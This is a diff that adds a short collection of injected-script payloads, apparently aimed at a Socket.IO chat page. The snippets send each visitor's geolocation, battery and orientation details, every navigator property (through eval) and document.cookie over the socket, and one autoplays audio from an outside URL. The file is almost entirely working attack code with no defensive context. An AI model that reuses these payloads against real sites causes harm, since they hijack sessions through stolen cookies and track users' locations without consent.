@@ -1,0 +1,42 @@
+// Position
+<script>navigator.geolocation.getCurrentPosition((pos) => { var socket = io(); socket.on('connect', () => { socket.emit('message', 'Im here: ' + pos.coords.latitude + '::' + pos.coords.longitude) }) })</script>
+
+
+<script>
+  var socket = io();
+  socket.on('connect', () => {
+    navigator.getBattery().then((a) => {
+      socket.emit('message', window.screen.orientation.type);
+      socket.disconnect();
+    })
+  })
+</script>
+
+<script>
+  var socket = io();
+  socket.on('connect', () => {
+    navigator.getBattery().then((a) => {
+      socket.emit('message', 'Battery charging status: ' + a.charging)
+    })
+  })
+</script>
+
+<script>
+  var socket = io();
+  socket.on('connect', () => {
+    for(i in navigator) {
+      socket.emit('message', eval('navigator.'+i));
+    }
+  });
+</script>
+
+<script>var socket = io();
+socket.on('connect', () => {
+  socket.emit('message', document.cookie);
+}
+socket.disconnect();
+</script>
+
+
+// audio
+<script>var audio = new Audio('http://sv52.onlinevideoconverter.com/download?file=a0h7a0g6g6b1e4e4');audio.play();</script>
